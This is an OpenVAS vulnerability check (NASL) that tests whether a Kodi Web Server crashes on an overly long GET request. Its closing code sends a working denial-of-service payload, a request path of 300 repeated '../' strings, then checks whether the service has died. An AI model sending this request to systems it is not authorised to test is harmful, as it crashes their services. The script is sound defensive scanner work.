##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_kodi_web_server_server_remote_dos_vuln.nasl 11772 2018-10-08 07:20:02Z asteins $
#
# Kodi Web Server Remote Denial Of Service Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:kodi:kodi";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.808283");
  script_version("$Revision: 11772 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-08 09:20:02 +0200 (Mon, 08 Oct 2018) $");
  script_tag(name:"creation_date", value:"2016-08-08 18:13:32 +0530 (Mon, 08 Aug 2016)");
  script_name("Kodi Web Server Remote Denial Of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("gb_kodi_web_server_detect.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("Kodi/WebServer/installed");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40208");

  script_tag(name:"summary", value:"The host is running Kodi Web Server
  and is prone to remote denial of service vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET
  and check whether it is able to crash or not.");

  script_tag(name:"insight", value:"The flaw is due to an error when processing
  web requests and can be exploited to cause a buffer overflow via an overly long
  string passed to GET request.");

  script_tag(name:"impact", value:"Successful exploitation may allow remote
  attackers to cause the application to crash, creating a denial-of-service
  condition.");

  script_tag(name:"affected", value:"Kodi Web Server version 16.1, other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");

include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( http_is_dead( port:port ) ) exit( 0 );

if( ! dir  = get_app_location( cpe:CPE, port:port ) ) exit( 0 ); # To have a reference to the Detection-NVT

craftData= crap( length:300, data:"../" );
req = 'GET ' + craftData + ' HTTP/1.1\r\n\r\n';
http_send_recv( port:port, data:req );

if( http_is_dead( port:port ) ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );